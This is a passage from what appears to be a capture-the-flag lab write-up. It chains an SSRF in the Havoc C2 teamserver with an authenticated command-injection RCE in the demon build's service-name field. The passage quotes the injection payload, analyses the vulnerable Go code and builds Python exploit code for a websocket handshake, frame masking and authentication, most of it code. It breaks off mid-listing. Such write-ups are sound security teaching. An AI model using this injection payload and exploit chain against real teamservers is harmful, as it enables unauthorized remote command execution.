+<p>With this SSRF, I’ll try to read the management port mentioned above:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run <span class="nt">--script</span> exploit.py <span class="nt">-t</span> https://10.10.11.49 <span class="nt">-i</span> 127.0.0.1 <span class="nt">-p</span> 40056
+<span class="go">...[snip]...
+HTTP/1.1 404 Not Found
+Content-Type: text/plain
+Date: Fri, 24 Jan 2025 18:59:07 GMT
+Content-Length: 18
+Connection: close
+
+404 page not found
+</span></code></pre></div></div>
+<p>The two filtered ports, 5000 and 7096, both return empty responses.</p>
+<h3 id="authenticated-rce">Authenticated RCE</h3>
+<h4 id="identify">Identify</h4>
+<p>A bit more searching leads to a post from Include Security, <a href="https://blog.includesecurity.com/2024/09/vulnerabilities-in-open-source-c2-frameworks/">Vulnerabilities in Open Source C2 Frameworks</a>. It’s a bit of an overview style, without going into a ton of detail. But in the section on Havoc, there’s mention of an authenticated RCE exploit:</p>
+<blockquote>
+<p>Havoc has an authenticated RCE vulnerability in the teamserver that is similar to the one in Sliver. Further, the <a href="https://github.com/HavocFramework/Havoc/blob/main/profiles/havoc.yaotl#L12">default Havoc configuration</a> creates two users with the password “password1234”, so anyone careless enough to run Havoc with default settings on an untrusted network can immediately be exploited by this RCE vulnerability. Teamservers that are firewalled off can still be hit due to a cool <a href="https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/">SSRF vulnerability</a> discovered by chebuya recently.</p>
+</blockquote>
+<p>The description even mentions the SSRF exploit I’ve already exploited! There’s more detail:</p>
+<blockquote>
+<p>An injection payload into the service name field looks something like <code class="language-plaintext highlighter-rouge">\" -mbla; CMD 1&gt;&amp;2 &amp;&amp; false #</code>:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">\"</code> to exit out the quotes</li>
+<li><code class="language-plaintext highlighter-rouge">-mbla</code> to cause the MinGW compilation to fail and not have to wait for it</li>
+<li><code class="language-plaintext highlighter-rouge">CMD 1&gt;&amp;2</code> with the chosen payload redirected to stderr</li>
+<li><code class="language-plaintext highlighter-rouge">&amp;&amp; false</code> to cause the command to fail and the server to send back the stderr output</li>
+<li><code class="language-plaintext highlighter-rouge">#</code> to comment out the parameters after our injection</li>
+</ul>
+</blockquote>
+<p>There’s a <a href="https://github.com/IncludeSecurity/c2-vulnerabilities/blob/main/havoc_auth_rce/havoc_rce.py">POC script</a> as well.</p>
+<p>The vulnerability is in the code that handles building binaries to deploy to demons. The <code class="language-plaintext highlighter-rouge">builder.go</code> <a href="https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/teamserver/pkg/common/builder/builder.go#L78">file</a> is entirely devoted to generating the correct command line string necessary to compile something, eventually passed to <code class="language-plaintext highlighter-rouge">exec</code> in the <code class="language-plaintext highlighter-rouge">Cmd</code> <a href="https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/teamserver/pkg/common/builder/builder.go#L1064-L1088">function</a>:</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">b</span> <span class="o">*</span><span class="n">Builder</span><span class="p">)</span> <span class="n">Cmd</span><span class="p">(</span><span class="n">cmd</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">bool</span> <span class="p">{</span>
+    <span class="k">var</span> <span class="p">(</span>
+        <span class="n">Command</span> <span class="o">=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
+        <span class="n">stdout</span>  <span class="n">bytes</span><span class="o">.</span><span class="n">Buffer</span>
+        <span class="n">stderr</span>  <span class="n">bytes</span><span class="o">.</span><span class="n">Buffer</span>
+        <span class="n">err</span>     <span class="kt">error</span>
+    <span class="p">)</span>
+
+    <span class="n">Command</span><span class="o">.</span><span class="n">Dir</span> <span class="o">=</span> <span class="n">b</span><span class="o">.</span><span class="n">sourcePath</span>
+    <span class="n">Command</span><span class="o">.</span><span class="n">Stdout</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stdout</span>
+    <span class="n">Command</span><span class="o">.</span><span class="n">Stderr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stderr</span>
+
+    <span class="n">err</span> <span class="o">=</span> <span class="n">Command</span><span class="o">.</span><span class="n">Run</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">Error</span><span class="p">(</span><span class="s">"Couldn't compile implant: "</span> <span class="o">+</span> <span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
+        <span class="k">if</span> <span class="o">!</span><span class="n">b</span><span class="o">.</span><span class="n">silent</span> <span class="p">{</span>
+            <span class="n">b</span><span class="o">.</span><span class="n">SendConsoleMessage</span><span class="p">(</span><span class="s">"Error"</span><span class="p">,</span> <span class="s">"couldn't compile implant: "</span><span class="o">+</span><span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
+            <span class="n">b</span><span class="o">.</span><span class="n">SendConsoleMessage</span><span class="p">(</span><span class="s">"Error"</span><span class="p">,</span> <span class="s">"compile output: "</span><span class="o">+</span><span class="n">stderr</span><span class="o">.</span><span class="n">String</span><span class="p">())</span>
+        <span class="p">}</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">Debug</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+        <span class="n">logger</span><span class="o">.</span><span class="n">Debug</span><span class="p">(</span><span class="s">"StdErr:</span><span class="se">\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">stderr</span><span class="o">.</span><span class="n">String</span><span class="p">())</span>
+        <span class="k">return</span> <span class="no">false</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="no">true</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Because it’s just joining a bunch of strings, we have an opportunity for command injection. Many of the parameters are sanitized, but the service name parameter is not.</p>
+<p>To exploit this, I’ll need to connect to the admin websocket, which is blocked by the firewall. I’ll have to use the SSRF above to generate that traffic.</p>
+<h4 id="breakdown">Breakdown</h4>
+<p>The RCE POC Python script creates a web socket and then sends three requests into it. The creation looks like:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ws</span> <span class="o">=</span> <span class="nf">create_connection</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">wss://</span><span class="si">{</span><span class="n">HOSTNAME</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s">/havoc/</span><span class="sh">"</span><span class="p">,</span>
+                       <span class="n">sslopt</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">cert_reqs</span><span class="sh">"</span><span class="p">:</span> <span class="n">ssl</span><span class="p">.</span><span class="n">CERT_NONE</span><span class="p">,</span> <span class="sh">"</span><span class="s">check_hostname</span><span class="sh">"</span><span class="p">:</span> <span class="bp">False</span><span class="p">})</span>
+</code></pre></div></div>
+<p>The first websocket message is to authenticate:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Body</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Info</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Password</span><span class="sh">"</span><span class="p">:</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha3_256</span><span class="p">(</span><span class="n">PASSWORD</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">(),</span> <span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">USER</span><span class="p">},</span> <span class="sh">"</span><span class="s">SubEvent</span><span class="sh">"</span><span class="p">:</span> <span class="mi">3</span><span class="p">},</span> <span class="sh">"</span><span class="s">Head</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Event</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="sh">"</span><span class="s">OneTime</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span> <span class="sh">"</span><span class="s">Time</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">18:40:17</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">USER</span><span class="p">}}</span>
+<span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">ws</span><span class="p">.</span><span class="nf">recv</span><span class="p">()))</span>
+</code></pre></div></div>
+<p>The second will create a listener to build an agent for:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Body</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">Info</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">Headers</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">HostBind</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">HostHeader</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">HostRotation</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">round-robin</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Hosts</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Name</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">abc</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">PortBind</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">443</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">PortConn</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">443</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Protocol</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">Https</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Proxy Enabled</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">false</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Secure</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Status</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">online</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">Uris</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">UserAgent</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span><span class="sh">"</span><span class="p">},</span><span class="sh">"</span><span class="s">SubEvent</span><span class="sh">"</span><span class="p">:</span><span class="mi">1</span><span class="p">},</span><span class="sh">"</span><span class="s">Head</span><span class="sh">"</span><span class="p">:{</span><span class="sh">"</span><span class="s">Event</span><span class="sh">"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="sh">"</span><span class="s">OneTime</span><span class="sh">"</span><span class="p">:</span><span class="sh">""</span><span class="p">,</span><span class="sh">"</span><span class="s">Time</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">08:39:18</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">USER</span><span class="p">}}</span>
+<span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+</code></pre></div></div>
+<p>The third one is to run the injection:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">"</span><span class="s">$ </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">injection</span> <span class="o">=</span> <span class="sh">"""</span><span class="s"> </span><span class="se">\\\\\\\"</span><span class="s"> -mbla; </span><span class="sh">"""</span> <span class="o">+</span> <span class="n">cmd</span> <span class="o">+</span> <span class="sh">"""</span><span class="s"> 1&gt;&amp;2 &amp;&amp; false #</span><span class="sh">"""</span>
+
+<span class="c1"># Command injection in demon compilation command
+</span><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Body</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Info</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">AgentType</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Demon</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Arch</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">x64</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Config</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">{</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Amsi/Etw Patch</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">None</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Indirect Syscall</span><span class="se">\"</span><span class="s">: false,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Injection</span><span class="se">\"</span><span class="s">: {</span><span class="se">\n</span><span class="s">        </span><span class="se">\"</span><span class="s">Alloc</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">Native/Syscall</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">        </span><span class="se">\"</span><span class="s">Execute</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">Native/Syscall</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">        </span><span class="se">\"</span><span class="s">Spawn32</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">C:</span><span class="se">\\\\</span><span class="s">Windows</span><span class="se">\\\\</span><span class="s">SysWOW64</span><span class="se">\\\\</span><span class="s">notepad.exe</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">        </span><span class="se">\"</span><span class="s">Spawn64</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">C:</span><span class="se">\\\\</span><span class="s">Windows</span><span class="se">\\\\</span><span class="s">System32</span><span class="se">\\\\</span><span class="s">notepad.exe</span><span class="se">\"\n</span><span class="s">    },</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Jitter</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">0</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Proxy Loading</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">None (LdrLoadDll)</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Service Name</span><span class="se">\"</span><span class="s">:</span><span class="se">\"</span><span class="sh">"</span> <span class="o">+</span> <span class="n">injection</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Sleep</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">2</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Sleep Jmp Gadget</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">None</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Sleep Technique</span><span class="se">\"</span><span class="s">: </span><span class="se">\"</span><span class="s">WaitForSingleObjectEx</span><span class="se">\"</span><span class="s">,</span><span class="se">\n</span><span class="s">    </span><span class="se">\"</span><span class="s">Stack Duplication</span><span class="se">\"</span><span class="s">: false</span><span class="se">\n</span><span class="s">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Format</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Windows Service Exe</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Listener</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">abc</span><span class="sh">"</span><span class="p">},</span> <span class="sh">"</span><span class="s">SubEvent</span><span class="sh">"</span><span class="p">:</span> <span class="mi">2</span><span class="p">},</span> <span class="sh">"</span><span class="s">Head</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">Event</span><span class="sh">"</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="sh">"</span><span class="s">OneTime</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">Time</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">18:39:04</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">USER</span><span class="p">}}</span>
+<span class="n">ws</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+</code></pre></div></div>
+<p>There is code in the POC to process the results and print it, but I’m going to focus on getting RCE.</p>
+<h3 id="create-exploit">Create Exploit</h3>
+<h4 id="strategy-1">Strategy</h4>
+<p>If I can set up this websocket connection over the SSRF and send three messages into it, I should get RCE. I’ll need to generate two functions. One to generate the HTTP GET request to initiate the websocket connection, and then one to generate messages to the websocket.</p>
+<p>I’ll make a copy of the SSRF POC and remove the last three lines where it sends a request to <code class="language-plaintext highlighter-rouge">/vulnerable</code> on the given host:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">request_data</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">GET /vulnerable HTTP/1.1</span><span class="se">\r\n</span><span class="s">Host: www.example.com</span><span class="se">\r\n</span><span class="s">Connection: close</span><span class="se">\r\n\r\n</span><span class="sh">"</span>
+<span class="nf">write_socket</span><span class="p">(</span><span class="n">socket_id</span><span class="p">,</span> <span class="n">request_data</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="nf">read_socket</span><span class="p">(</span><span class="n">socket_id</span><span class="p">).</span><span class="nf">decode</span><span class="p">())</span>
+</code></pre></div></div>
+<h4 id="initiate-websocket">Initiate Websocket</h4>
+<p>ChatGPT is actually pretty good at giving me what I need here:</p>
+<picture>
+<source srcset="/img/image-20250124150846210.webp" type="image/webp"/>
+<img alt="image-20250124150846210" class="include_image" loading="lazy" src="/img/image-20250124150846210.png"/>
+</picture>
+<p>My function looks like:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">create_websocket_init_req</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
+    <span class="n">websocket_key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">randombytes12345</span><span class="sh">"</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">request</span> <span class="o">=</span> <span class="p">(</span>
+        <span class="sa">f</span><span class="sh">"</span><span class="s">GET </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s"> HTTP/1.1</span><span class="se">\r\n</span><span class="sh">"</span>
+        <span class="sa">f</span><span class="sh">"</span><span class="s">Host: </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="se">\r\n</span><span class="sh">"</span>
+        <span class="sa">f</span><span class="sh">"</span><span class="s">Upgrade: websocket</span><span class="se">\r\n</span><span class="sh">"</span>
+        <span class="sa">f</span><span class="sh">"</span><span class="s">Connection: Upgrade</span><span class="se">\r\n</span><span class="sh">"</span>
+        <span class="sa">f</span><span class="sh">"</span><span class="s">Sec-WebSocket-Key: </span><span class="si">{</span><span class="n">websocket_key</span><span class="si">}</span><span class="se">\r\n</span><span class="sh">"</span>
+        <span class="sa">f</span><span class="sh">"</span><span class="s">Sec-WebSocket-Version: 13</span><span class="se">\r\n</span><span class="sh">"</span>
+        <span class="sa">f</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span>
+    <span class="p">).</span><span class="nf">encode</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">request</span>
+</code></pre></div></div>
+<p>And I’ll use this to initiate the websocket at the end of the exploit:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">init_ws_request</span> <span class="o">=</span> <span class="nf">create_websocket_init_req</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">,</span> <span class="sh">'</span><span class="s">/havoc/</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">write_socket</span><span class="p">(</span><span class="n">socket_id</span><span class="p">,</span> <span class="n">init_ws_request</span><span class="p">)</span>
+</code></pre></div></div>
+<h4 id="generate-frame">Generate Frame</h4>
+<p>Now I need to send messages or frames into the socket. ChatGPT is really nice here, helping me to generate this function:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">create_websocket_frame</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">message</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">payload_length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">first_byte</span> <span class="o">=</span> <span class="mb">0b10000001</span>  <span class="c1"># Binary: FIN = 1, Opcode = 1
+</span>
+    <span class="k">if</span> <span class="n">payload_length</span> <span class="o">&lt;=</span> <span class="mi">125</span><span class="p">:</span>
+        <span class="n">second_byte</span> <span class="o">=</span> <span class="mb">0b10000000</span> <span class="o">|</span> <span class="n">payload_length</span>
+        <span class="n">frame</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">!BB</span><span class="sh">"</span><span class="p">,</span> <span class="n">first_byte</span><span class="p">,</span> <span class="n">second_byte</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">payload_length</span> <span class="o">&lt;=</span> <span class="mi">65535</span><span class="p">:</span>
+        <span class="n">second_byte</span> <span class="o">=</span> <span class="mb">0b10000000</span> <span class="o">|</span> <span class="mi">126</span>
+        <span class="n">frame</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">!BBH</span><span class="sh">"</span><span class="p">,</span> <span class="n">first_byte</span><span class="p">,</span> <span class="n">second_byte</span><span class="p">,</span> <span class="n">payload_length</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">second_byte</span> <span class="o">=</span> <span class="mb">0b10000000</span> <span class="o">|</span> <span class="mi">127</span>
+        <span class="n">frame</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">!BBQ</span><span class="sh">"</span><span class="p">,</span> <span class="n">first_byte</span><span class="p">,</span> <span class="n">second_byte</span><span class="p">,</span> <span class="n">payload_length</span><span class="p">)</span>
+
+    <span class="n">masking_key</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="nf">randbytes</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">frame</span> <span class="o">+=</span> <span class="n">masking_key</span>
+    <span class="n">masked_payload</span> <span class="o">=</span> <span class="nf">bytearray</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">masking_key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">payload_length</span><span class="p">))</span>
+    <span class="n">frame</span> <span class="o">+=</span> <span class="n">masked_payload</span>
+
+    <span class="k">return</span> <span class="n">frame</span>
+</code></pre></div></div>
+<h4 id="sending-messages">Sending Messages</h4>
+<p>The first message is the authentication message. I’ll add a couple of arguments to the script to read in the username, password, and command:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">-U</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">--admin-username</span><span class="sh">"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Username for admin auth</span><span class="sh">"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">-P</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">--password</span><span class="sh">"</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Password for admin auth</span><span class="sh">"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">'</span><span class="s">-c</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">--cmd</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">Command to run</span><span class="sh">"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+<p>I’ll copy the payload from the RCE POC and pass it to the function to generate websocket frames:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># auth
+</span><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Body</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Info</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Password</span><span class="sh">"</span><span class="p">:</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha3_256</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">password</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">(),</span> <span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">admin_username</span><span class="p">},</span> <span class="sh">"</span><span class="s">SubEvent</span><span class="sh">"</span><span class="p">:</span> <span class="mi">3</span><span class="p">},</span> <span class="sh">"</span><span class="s">Head</span><span class="sh">"</span><span class="p">:</span> <span class="p">{</span><span class="sh">"</span><span class="s">Event</span><span class="sh">"</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="sh">"</span><span class="s">OneTime</span><span class="sh">"</span><span class="p">:</span> <span class="sh">""</span><span class="p">,</span> <span class="sh">"</span><span class="s">Time</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">18:40:17</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">User</span><span class="sh">"</span><span class="p">:</span> <span class="n">args</span><span class="p">.</span><span class="n">admin_username</span><span class="p">}}</span>
+<span class="n">message</span> <span class="o">=</span> <span class="nf">create_websocket_frame</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="nf">write_socket</span><span class="p">(</span><span class="n">socket_id</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span>
+</code></pre></div></div>
+<p>The next frame is creating some kind of listener. I’ll only need to update the variable name holding the username at the end:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># listener
